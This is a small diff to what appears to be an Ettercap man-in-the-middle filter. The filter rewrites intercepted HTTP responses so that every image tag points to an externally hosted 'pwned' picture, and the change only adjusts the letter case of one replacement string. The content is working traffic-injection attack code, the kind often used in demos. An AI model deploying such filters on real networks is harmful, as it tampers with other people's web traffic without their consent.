@@ -43,6 +43,6 @@ if (ip.proto == TCP && tcp.dst == 80) {
 # change server response to target
 if (ip.proto == TCP && tcp.src == 80) {
   replace("img src=", "img src=\"http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg\" ");  
-  replace("IMG SRC=", "img src=\"http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg\" ");   
+  replace("IMG SRC=", "IMG SRC=\"http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg\" ");   
 } 
 
